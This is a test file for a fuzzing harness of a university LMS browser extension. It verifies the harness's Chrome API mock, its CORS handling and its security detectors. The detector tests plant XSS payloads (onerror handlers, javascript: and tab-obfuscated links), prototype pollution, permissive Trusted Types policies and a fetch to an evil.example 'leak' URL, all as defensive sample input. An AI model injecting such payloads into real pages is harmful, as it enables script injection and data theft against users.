// SPDX-FileCopyrightText: 2026 Yuma Kakei <yumasansansan@gmail.com>
// SPDX-License-Identifier: GPL-3.0-or-later
//
// This file is part of kulms-extension-fuzz. The SPDX lines name its copyright
// holder and its license, in the machine-readable form of the REUSE
// specification: the GNU General Public License, version 3 or any later version
// (LICENSES/GPL-3.0-or-later.txt).
//
// The harness itself: that it changes no line of a script it exposes, that its
// chrome API behaves as Chrome's does where the extension depends on it, and
// that its detectors see what they are for.
import test from "node:test";
import assert from "node:assert/strict";
import vm from "node:vm";
import v8 from "node:v8";
import { createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { Browser, Clock, EXT, Net, contentScriptsFor, exposeInternals, idle, measure, openBackground, openBareTab, openPopup, openTab, read, watch } from "../harness/index.mjs";
import { beginInput, endInput } from "../harness/work.mjs";
import { LMS } from "./lms.mjs";

test("exposing an IIFE's internals moves no line and keeps its directive first", () => {
  const code = '(function () {\n  "use strict";\n  var a = 1;\n  let b = 2;\n  const c = 3;\n  function f() { return a + b + c; }\n  if (true) return;\n})();\n';
  const out = exposeInternals(code, "x.js");
  assert.equal(out.split("\n").length, code.split("\n").length);
  assert.match(out.split("\n")[1], /^ {2}"use strict"; if \(globalThis\.__kulmsExpose\)/);
  let internals;
  const g = { __kulmsExpose: (file, i) => { internals = i; } };
  new Function("g", out.replace(/globalThis/g, "g"))(g);
  assert.equal(internals.f(), 6);
  internals.a = 10;
  assert.equal(internals.f(), 15);
  assert.equal(Object.getOwnPropertyDescriptor(internals, "c").set, undefined);
});

test("exposing every script of the extension moves no line of it", () => {
  const scripts = [...new Set(contentScriptsFor(`${LMS}/portal`).concat(["background.js", "popup.js", "src/auth-totp.js", "src/auth-totp-register.js"]))]
    .filter((s) => !s.startsWith("vendor/"));
  for (const s of scripts) {
    const code = read(s);
    assert.equal(exposeInternals(code, s).split("\n").length, code.split("\n").length, s);
  }
});

test("a message with no listener to take it gives lastError, as Chrome does", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  const seen = await new Promise((resolve) => tab.window.chrome.runtime.sendMessage({ type: "x" }, () => resolve(tab.window.chrome.runtime.lastError)));
  assert.match(seen.message, /Receiving end does not exist/);
  assert.equal(tab.window.chrome.runtime.lastError, undefined);
});

test("the extension's draws of chance begin anew with each input, the same from the same seed", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const bg = openBackground(browser);
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  // Three draws in the background and three in the tab, as an input whose
  // seed is `seed` draws them.
  const draws = (seed) => {
    beginInput(0, { judge: false, seed });
    const got = [...vm.runInContext("[Math.random(), Math.random(), Math.random()]", bg.global), ...tab.window.eval("[Math.random(), Math.random(), Math.random()]")];
    endInput();
    return got;
  };
  const first = draws(7);
  assert.deepEqual(draws(7), first);
  assert.notDeepEqual(draws(8), first);
  for (const x of first) assert.ok(x >= 0 && x < 1, `${x} is a draw in [0, 1)`);
  assert.equal(new Set(first).size, first.length);
});

test("an answer arrives even when copying it passes what the input's work may be", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const bg = openBackground(browser);
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  // A listener that answers, and answers again with the error when its answer
  // throws, as the extension's listeners catch what their work throws.
  vm.runInContext(`chrome.runtime.onMessage.addListener((m, sender, sendResponse) => {
    try { sendResponse({ books: ["${"x".repeat(1000)}"] }); } catch (e) { sendResponse({ error: String(e) }); }
  });`, bg.global);
  // Enough work for the message to reach the listener, not for the answer's
  // copy into the tab's realm, which counts its thousand units.
  beginInput(0, { cap: 200, code: browser });
  const answered = await Promise.race([browser.deliver(tab, [bg], { type: "x" }).then(() => true, () => true), idle().then(() => false)]);
  const work = endInput();
  assert.ok(work.over, "the answer's copy passed the work it may be");
  assert.ok(answered, "the answer was lost where its copy threw");
});

test("what one tab stores another reads, and is told of", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const a = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  const b = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  const changes = [];
  b.window.chrome.storage.onChanged.addListener((c, area) => changes.push([Object.keys(c), area]));
  a.window.chrome.storage.local.set({ k: { v: [1, 2] } });
  await idle();
  const got = await new Promise((resolve) => b.window.chrome.storage.local.get("k", resolve));
  assert.deepEqual(JSON.parse(JSON.stringify(got)), { k: { v: [1, 2] } });
  assert.ok(Array.isArray(got.k.v) && got.k.v instanceof b.window.Array, "the value comes out in the reader's realm");
  assert.deepEqual(changes, [[["k"], "local"]]);
});

test("a tab may fetch only the extension's files that web_accessible_resources opens to it", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  const ok = await tab.window.fetch(tab.window.chrome.runtime.getURL("_locales/ja/messages.json"));
  assert.ok((await ok.json()).extName);
  await assert.rejects(tab.window.fetch(tab.window.chrome.runtime.getURL("background.js")));
});

// A fuzz target runs millions of inputs in one browser; the daily fuzzing ran
// out of its 4 GB when these logs kept every entry.
test("the logs of the console, of the network, of the messages and of what the detectors look through are forgotten when asked", async (t) => {
  const net = new Net().on("https://www.k.kyoto-u.ac.jp/", { body: "" });
  const browser = new Browser();
  t.after(() => browser.close());
  const bg = openBackground(browser, { net });
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  const watcher = watch(tab);
  bg.global.console.log("line");
  await bg.global.fetch("https://www.k.kyoto-u.ac.jp/");
  await browser.deliver(tab, [bg], { type: "x" }).catch(() => {}); // no listener answers it
  browser.report(tab, new tab.window.Error("thrown"));
  browser.caughtBy(tab, new tab.window.TypeError("x is not a function"), "src/x.js:1 in f");
  tab.window.document.body.innerHTML = "<b>x</b>";
  const logs = () => [["console", bg.logs], ["network", net.requests], ["messages", browser.traffic], ["errors", browser.errors], ["caught", browser.caught], ["untrusted", browser.untrusted]];
  for (const [name, log] of logs()) assert.equal(log.length, 1, name);
  browser.forget();
  net.forget();
  for (const [name, log] of logs()) assert.equal(log.length, 0, name);
  // A watcher made before looks through the whole of each log from then on.
  browser.report(tab, new tab.window.Error("after"));
  assert.match(watcher.check().join("\n"), /after/);
});

test("a response from where TLS does not vouch for it reaches the extension only as CORS lets it, and reading its body is reported", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const net = new Net()
    .on(`${LMS}/a`, { body: "a", url: "https://evil.example/a" })
    .on(`${LMS}/b`, { body: "b", url: "https://evil.example/b", headers: { "Access-Control-Allow-Origin": "*" } })
    .on(`${LMS}/c`, { body: "c", url: "http://lms.gakusei.kyoto-u.ac.jp/c", headers: { "access-control-allow-origin": "null" } })
    .on(`${LMS}/d`, { body: "d", url: `${LMS}/portal/xlogin` })
    .on(`${LMS}/e`, { body: "e", url: (asked) => asked.replace(/\/e$/, "/f") });
  const bg = openBackground(browser, { net });
  const watcher = watch(bg);
  const get = (path, init) => bg.global.fetch(`${LMS}${path}`, init);
  await assert.rejects(get("/a"), { name: "TypeError" }, "no CORS from elsewhere: the fetch fails");
  assert.equal(await (await get("/b")).text(), "b");
  const c = await get("/c");
  assert.equal(c.redirected, true);
  assert.equal(await c.json().catch(() => "not JSON"), "not JSON");
  assert.equal(await (await get("/d")).text(), "d", "the LMS's own login page is vouched for");
  const e = await get("/e");
  assert.equal(e.url, `${LMS}/f`);
  await e.text();
  await assert.rejects(get("/b", { redirect: "error" }), { name: "TypeError" });
  const manual = await get("/b", { redirect: "manual" });
  assert.deepEqual([manual.type, manual.status, manual.ok, await manual.text()], ["opaqueredirect", 0, false, ""]);
  const problems = watcher.check().join("\n");
  assert.match(problems, /the body of a response that a redirect brought from https:\/\/evil\.example\/b, which is not over https from an origin of the extension's host permissions, read in background/);
  assert.match(problems, /that a redirect brought from http:\/\/lms\.gakusei\.kyoto-u\.ac\.jp\/c,/);
  assert.doesNotMatch(problems, /xlogin|\/f,|evil\.example\/a/);
});

test("the CORS check of a redirected or cross-origin response follows the Fetch Standard: credentials, the hidden origin, content scripts, mixed content", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const elsewhere = (path, headers) => ({ body: path, url: `https://evil.example${path}`, headers });
  const net = new Net()
    .on(`${LMS}/star`, elsewhere("/star", { "Access-Control-Allow-Origin": "*" }))
    .on(`${LMS}/null`, elsewhere("/null", { "Access-Control-Allow-Origin": "null", "Access-Control-Allow-Credentials": "true" }))
    .on(`${LMS}/page`, elsewhere("/page", { "Access-Control-Allow-Origin": LMS }))
    .on(`${LMS}/http`, { body: "http", url: "http://lms.gakusei.kyoto-u.ac.jp/http", headers: { "Access-Control-Allow-Origin": "*" } })
    .on(`${LMS}/user`, { body: "user", url: `https://user:pass@evil.example/user`, headers: { "Access-Control-Allow-Origin": "*" } })
    .on(`${LMS}/ftp`, { body: "ftp", url: "ftp://lms.gakusei.kyoto-u.ac.jp/x" })
    .on("https://evil.example/direct", { body: "direct", headers: { "Access-Control-Allow-Origin": "*" } })
    .on("https://evil.example/closed", { body: "closed" });
  const bg = openBackground(browser, { net });
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [], net });
  const from = (context) => (path, init) => context.global.fetch(path.startsWith("https://") ? path : `${LMS}${path}`, init);
  const back = from(bg);
  const page = from(tab);
  const outcome = (promise) => promise.then((r) => r.text(), (e) => `failed: ${e.name}`);
  const results = {
    // The service worker: the LMS is in its host permissions; after a redirect
    // elsewhere, its origin serializes as "null" (redirect-taint).
    star: await outcome(back("/star")),
    starWithCredentials: await outcome(back("/star", { credentials: "include" })),
    nullWithCredentials: await outcome(back("/null", { credentials: "include" })),
    pageOrigin: await outcome(back("/page")),
    http: await outcome(back("/http")),
    user: await outcome(back("/user")),
    ftp: await outcome(back("/ftp")),
    direct: await outcome(back("https://evil.example/direct")),
    closed: await outcome(back("https://evil.example/closed")),
    // A content script: its request is the page's, from the LMS's origin,
    // which a redirect from that origin leaves as it is.
    pageStar: await outcome(page("/star")),
    pagePage: await outcome(page("/page")),
    pageNull: await outcome(page("/null", { credentials: "include" })),
    pageHttp: await outcome(page("/http")),
  };
  assert.deepEqual(results, {
    star: "/star",
    starWithCredentials: "failed: TypeError",
    nullWithCredentials: "/null",
    pageOrigin: "failed: TypeError",
    http: "http",
    user: "failed: TypeError",
    ftp: "failed: TypeError",
    direct: "direct",
    closed: "failed: TypeError",
    pageStar: "/star",
    pagePage: "/page",
    pageNull: "failed: TypeError",
    pageHttp: "failed: TypeError",
  });
});

test("innerText is as the HTML Standard defines it for a user agent without CSS: the text content, and line breaks set as <br>", (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const tab = openTab(browser, { url: `${LMS}/portal`, html: "<p id=p>a<b>b</b><span hidden>c</span></p>", scripts: [] });
  const p = tab.document.getElementById("p");
  assert.equal(p.innerText, "abc");
  p.innerText = "x\r\ny\rz\n";
  assert.equal(p.innerHTML, "x<br>y<br>z<br>");
  p.innerText = null;
  assert.equal(p.innerHTML, "");
});

test("the HTML parser takes a lone surrogate as a code point of its own, as the HTML Standard's input stream does", (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  // Two low surrogates, then a pair: parse5 alone joins the first two into a
  // code point past U+10FFFF and throws.
  const tab = openTab(browser, { url: `${LMS}/portal`, html: '<p title="\udc00\udcdc\ud800\udc00">x\udc00\udcdcy</p>', scripts: [] });
  const p = tab.document.querySelector("p");
  const points = (text) => [...text].map((c) => c.codePointAt(0));
  assert.deepEqual(points(p.title), [0xdc00, 0xdcdc, 0x10000]);
  assert.deepEqual(points(p.textContent), [0x78, 0xdc00, 0xdcdc, 0x79]);
  tab.document.body.innerHTML = "<b>\udc00\udcdc</b>";
  assert.deepEqual(points(tab.document.body.textContent), [0xdc00, 0xdcdc]);
});

test("a page's timers are set as the HTML Standard's timer initialization steps set them", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const clock = new Clock(0);
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [], clock });
  const w = tab.window;
  // A chain of timeouts of 0 ms: a task nested more than five deep sets the
  // next one at 4 ms at least.
  const chain = [];
  const next = () => {
    chain.push(clock.now);
    if (chain.length < 8) w.setTimeout(next, 0);
  };
  w.setTimeout(next, 0);
  // A timeout is a long (Web IDL): 2^31 ms comes out negative, and 0.
  let wrapped = null;
  w.setTimeout(() => { wrapped = clock.now; }, 2 ** 31);
  // An interval of 0 ms, likewise nested one deeper on each run.
  const ticks = [];
  const id = w.setInterval(() => {
    ticks.push(clock.now);
    if (ticks.length === 8) w.clearInterval(id);
  }, 0);
  assert.throws(() => w.setTimeout(() => {}, 1n), { name: "TypeError" });
  await clock.advance(100);
  assert.deepEqual(chain, [0, 0, 0, 0, 0, 0, 4, 8]);
  assert.equal(wrapped, 0);
  assert.deepEqual(ticks, [0, 0, 0, 0, 0, 0, 4, 8]);
  assert.equal(clock.pending(), 0);
});

test("every page counts the reads of a live collection alike, however many pages came before it", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  openBackground(browser, {});
  const counts = [];
  for (let i = 0; i < 3; i++) {
    const tab = openTab(browser, { url: `${LMS}/portal`, html: "<a></a>".repeat(100), scripts: [] });
    counts.push(await measure(() => {
      let n = 0;
      for (const a of tab.document.getElementsByTagName("a")) if (a) n++;
      tab.document.getElementsByTagName("a")[Symbol.iterator]();
      return n;
    }));
    tab.close();
  }
  assert.ok(counts[0] > 100 * 10, `the reads are counted (${counts[0]})`);
  assert.deepEqual(counts, [counts[0], counts[0], counts[0]]);
});

test("a call that loops to a length it is given passes the bound before it runs, not hours after", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const tab = openTab(browser, { url: `${LMS}/portal`, scripts: [] });
  const w = tab.window;
  beginInput(10, { code: { sites: 1 } });
  const started = Date.now();
  assert.throws(() => w.Array.from({ length: 2 ** 32 - 2 }), { name: "WorkExceeded" });
  assert.throws(() => w.Uint8Array.from({ length: 2 ** 40 }), { name: "WorkExceeded" });
  assert.ok(Date.now() - started < 1000, "neither ran");
  assert.equal(endInput().over, true);
  // One within the bound runs, and counts as it did.
  beginInput(10, { code: { sites: 1 } });
  assert.equal(w.Array.from({ length: 3, 0: "a" }).length, 3);
  assert.deepEqual([...w.Array.from(new w.Set([1, 2]))], [1, 2], "an iterable is gone through as it goes");
  assert.equal(endInput().over, false);
});

test("a page that closed is let go: the harness keeps no window it closed", async (t) => {
  v8.setFlagsFromString("--expose-gc");
  const gc = vm.runInNewContext("gc");
  const browser = new Browser();
  t.after(() => browser.close());
  const net = new Net();
  openBackground(browser, { net });
  // A page opened, looked at and closed, as a fuzz target does with each
  // input; a function of its own, whose frame is gone when it returns.
  const page = async () => {
    const tab = openTab(browser, { url: `${LMS}/portal`, html: "<a></a>".repeat(100), scripts: ["src/settings.js", "src/tree-view.js"], net });
    const watcher = watch(tab);
    await idle();
    tab.document.body.innerHTML = "<p>x</p>"; // a string at a sink, which the harness logs
    browser.caughtBy(tab, new tab.window.TypeError("x"), "src/x.js:1 in f");
    watcher.check();
    browser.forget();
    net.forget();
    tab.close();
    return new WeakRef(tab.window);
  };
  const windows = [];
  for (let i = 0; i < 4; i++) windows.push(await page());
  for (let i = 0; i < 10 && windows.some((w) => w.deref()); i++) {
    await new Promise((resolve) => setImmediate(resolve));
    gc();
  }
  assert.deepEqual(windows.map((w) => (w.deref() ? "kept" : "let go")), ["let go", "let go", "let go", "let go"]);
});

test("the detectors see markup that runs script, a polluted prototype and an error of a listener", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const tab = openTab(browser, { url: `${LMS}/portal`, html: '<body><a href="javascript:void(0)" onclick="x()">kept</a></body>', scripts: [] });
  const bg = openBackground(browser);
  const w = watch(tab);
  assert.deepEqual(w.check(), [], "what the page had before is not reported");
  tab.document.body.insertAdjacentHTML("beforeend", '<img src="x" onerror="alert(1)"><a href="javascript:alert(1)">x</a>');
  tab.window.eval("Object.prototype.polluted = 1");
  bg.events.onMessage.addListener(() => { throw new Error("boom"); });
  await browser.deliver(tab, [bg], {}).catch(() => {});
  const problems = w.check().join("\n");
  assert.match(problems, /<img src="x" onerror="alert\(1\)">/);
  assert.match(problems, /<a href="javascript:alert\(1\)">/);
  assert.match(problems, /Object\.prototype gained polluted/);
  assert.match(problems, /boom/);
});

// What each detector sees that the first test does not show (harness/detectors.mjs).
test("the detectors see what changes on an old element, scripts and styles with no nonce, tampered intrinsics, swallowed slips and requests elsewhere", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const net = new Net().on("https://evil.example/", { body: "" }).on(`${LMS}/`, { body: "" });
  const tab = openTab(browser, { url: `${LMS}/portal`, net, scripts: [], html: '<body><a id="old" href="/x">old</a><p id="p">p</p><script>var page = 1;</script></body>' });
  const w = watch(tab);
  assert.deepEqual(w.check(), [], "what the page had before is not reported");
  const d = tab.document;
  // An old element: a link made javascript: with a tab in its scheme, which
  // the URL parser drops, and a handler put on it.
  d.getElementById("old").setAttribute("href", "java\tscript:alert(1)");
  d.getElementById("old").setAttribute("onmouseover", "x()");
  // Scripts of the extension's own files: one with nothing to verify it, one
  // with a nonce, which verifies nothing, one with a hash that is not of the
  // file, and one with the file's hash; a style, with a nonce or not; a style
  // attribute set with setAttribute(), and one the CSSOM sets.
  const src = (rel) => tab.window.chrome.runtime.getURL(rel);
  const script = (rel, attrs) => {
    const el = d.createElement("script");
    for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, v);
    el.src = src(rel);
    d.head.append(el);
  };
  script("src/grading-ta-page.js", {});
  script("src/settings.js", { nonce: "n" });
  script("src/course-click.js", { integrity: "sha384-x" });
  const hash = createHash("sha384").update(fs.readFileSync(path.join(EXT, "src/tree-view.js"))).digest("base64");
  script("src/tree-view.js", { integrity: `sha384-${hash}` });
  const style = d.createElement("style");
  style.textContent = "p { color: red }";
  d.head.append(style);
  const noncedStyle = d.createElement("style");
  noncedStyle.setAttribute("nonce", "n");
  noncedStyle.textContent = "q { color: red }";
  d.head.append(noncedStyle);
  d.getElementById("p").setAttribute("style", "color: blue");
  const cssom = d.createElement("span");
  cssom.style.color = "green";
  d.body.append(cssom);
  // Markup of a policy's TrustedHTML, which a page that requires Trusted Types
  // takes, from a policy that keeps only text; an empty string, which it does
  // not take; a policy that lets anything through, and a default policy.
  const policy = tab.window.trustedTypes.createPolicy("text", { createHTML: (html) => html.replace(/[<>&"]/g, "") });
  d.getElementById("p").insertAdjacentHTML("beforeend", policy.createHTML("<b>trusted</b>"));
  d.getElementById("p").innerHTML = "";
  tab.window.trustedTypes.createPolicy("anything", { createHTML: (html) => html, createScriptURL: (u) => u, createScript: (s) => s });
  // An image from an origin the extension has no business with, and an SVG
  // animation that makes a link javascript:.
  d.body.insertAdjacentHTML("beforeend", '<img src="https://evil.example/x.png"><svg><a><animate attributeName="href" to="javascript:alert(1)"/></a></svg>');
  // Tampered intrinsics: a method replaced, the iterator prototype polluted, a global built-in replaced.
  tab.window.eval("Array.prototype.map = function () {}; Object.getPrototypeOf(Object.getPrototypeOf([][Symbol.iterator]())).polluted = 1; JSON = {}");
  // Slips swallowed by a catch clause, a rejection handler and allSettled; a
  // request elsewhere.
  browser.caughtBy(tab, new tab.window.TypeError("Cannot read properties of null (reading 'x')"), "src/x.js:1 in f");
  browser.caughtBy(tab, new tab.window.SyntaxError("Unexpected token"), "src/x.js:2 in g");
  await tab.window.Promise.allSettled([tab.window.Promise.reject(new tab.window.TypeError("y is not a function"))]);
  // The request goes out; its answer, which no CORS header lets the page
  // read, does not come back (the Fetch Standard's CORS check).
  await assert.rejects(tab.window.fetch("https://evil.example/leak?x=1"), { name: "TypeError" });
  const problems = w.check().join("\n");
  assert.match(problems, /<a id="old" href="java\\tscript:alert\(1\)".*\(href="java\\tscript:alert\(1\)"#\S+\)/);
  assert.match(problems, /\(onmouseover="x\(\)"#\S+\)/);
  assert.match(problems, /script from "chrome-extension:\/\/\w+\/src\/grading-ta-page\.js"#\S+ that no integrity hash verifies/);
  assert.match(problems, /script from "chrome-extension:\/\/\w+\/src\/settings\.js"#\S+ that no integrity hash verifies/, "a nonce verifies nothing");
  assert.match(problems, /script from "chrome-extension:\/\/\w+\/src\/course-click\.js"#\S+ that no integrity hash verifies/, "a hash not of the file");
  assert.doesNotMatch(problems, /tree-view\.js that no integrity/, "the file's own hash verifies it");
  assert.match(problems, /\(style: "q \{ color: red \}"#\S+\)/, "a style with a nonce is a style all the same");
  assert.match(problems, /a policy of Trusted Types whose createHTML lets markup that runs script through \(trustedTypes\.createPolicy\("anything"\)/);
  assert.match(problems, /a policy of Trusted Types whose createScriptURL lets javascript:alert\(1\) through/);
  assert.match(problems, /a policy of Trusted Types whose createScript makes script of any text/);
  assert.doesNotMatch(problems, /createPolicy\("text"\)/, "a policy that keeps only text");
  assert.match(problems, /a string passed to HTMLScriptElement\.src .*unless it is a TrustedScriptURL: "chrome-extension:\/\/\w+\/src\/grading-ta-page\.js"/);
  assert.match(problems, /a string passed to Element\.innerHTML .*unless it is a TrustedHTML: ""/);
  assert.match(problems, /a string passed to Element\.insertAdjacentHTML .*<img src=/);
  assert.doesNotMatch(problems, /trusted<\/b>/, "a policy's TrustedHTML is taken");
  assert.match(problems, /a string passed to Element\.setAttribute .*TrustedScript: "x\(\)"/);
  assert.match(problems, /\(style: "p \{ color: red \}"#\S+\)/);
  assert.match(problems, /an inline style that markup or setAttribute\(\) gave.*<p id="p" style="color: blue">/);
  assert.doesNotMatch(problems, /<span style/);
  assert.match(problems, /loads src="https:\/\/evil\.example\/x\.png"#/);
  assert.match(problems, /animates href to="javascript:alert\(1\)"#/);
  assert.match(problems, /Array\.prototype changed map/);
  assert.match(problems, /(?:%IteratorPrototype%|Iterator\.prototype) gained polluted/);
  assert.match(problems, /the global object's JSON was replaced/);
  assert.match(problems, /a slip the extension caught at src\/x\.js:1 in f.*Cannot read properties of null/);
  assert.doesNotMatch(problems, /Unexpected token/);
  assert.match(problems, /a slip the extension caught at Promise\.allSettled\(\).*y is not a function/);
  assert.match(problems, /a request to https:\/\/evil\.example\/leak\?x=1, outside the extension's host permissions/);
  assert.doesNotMatch(problems, /var page/, "the page's own script is not reported");
});

// chrome.tabs as Chrome's documentation has it
// (https://developer.chrome.com/docs/extensions/reference/api/tabs), and
// activeTab (https://developer.chrome.com/docs/extensions/develop/concepts/activeTab).
test("the tabs are told as Chrome tells them: the one in front, and the URL of a page only where the extension may see it", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const lms = openBareTab(browser, { url: `${LMS}/portal` });
  const elsewhere = openBareTab(browser, { url: "https://example.com/a" });
  const popup = openPopup(browser);
  const query = (info) => new Promise((resolve) => popup.window.chrome.tabs.query(info, (tabs) => resolve(JSON.parse(JSON.stringify(tabs)))));
  // The tab opened last is in front, and the popup, opened from the action,
  // has activeTab for it: its URL is told.
  assert.deepEqual(await query({}), [
    { id: lms.tabId, index: 0, windowId: 1, active: false, url: `${LMS}/portal` },
    { id: elsewhere.tabId, index: 1, windowId: 1, active: true, url: "https://example.com/a" },
  ]);
  assert.deepEqual((await query({ active: true, currentWindow: true })).map((tab) => tab.id), [elsewhere.tabId]);
  assert.deepEqual((await query({ url: `${LMS}/*` })).map((tab) => tab.id), [lms.tabId]);
  assert.deepEqual(await query({ currentWindow: false }), []);
  // A tab opened later comes to the front; activeTab was not given for it, so
  // its URL is not told, and no URL pattern matches it.
  const later = openBareTab(browser, { url: "https://example.org/b" });
  assert.deepEqual(await query({ active: true }), [{ id: later.tabId, index: 2, windowId: 1, active: true }]);
  assert.deepEqual(await query({ url: "https://example.org/*" }), []);
  // A tab closed is gone from the list, and what activeTab gave for it ends.
  elsewhere.close();
  assert.deepEqual((await query({})).map((tab) => [tab.id, tab.index]), [[lms.tabId, 0], [later.tabId, 1]]);
  assert.equal(browser.granted.has(elsewhere.tabId), false);
});

test("a message to a tab reaches the listeners of its content scripts, and one to a tab with none is an error", async (t) => {
  const browser = new Browser();
  t.after(() => browser.close());
  const answering = openBareTab(browser, { url: `${LMS}/portal` });
  answering.events.onMessage.addListener((message, sender, sendResponse) => {
    sendResponse({ ok: message.type === "x" });
  });
  const none = openBareTab(browser, { url: `${LMS}/portal/site/C1` });
  const popup = openPopup(browser);
  const send = (tabId) => new Promise((resolve) => popup.window.chrome.tabs.sendMessage(tabId, { type: "x" }, { frameId: 0 }, (response) => {
    const error = popup.window.chrome.runtime.lastError;
    resolve({ response: response === undefined ? undefined : JSON.parse(JSON.stringify(response)), error: error && error.message });
  }));
  assert.deepEqual(await send(answering.tabId), { response: { ok: true }, error: undefined });
  assert.deepEqual(await send(none.tabId), { response: undefined, error: "Could not establish connection. Receiving end does not exist." });
});
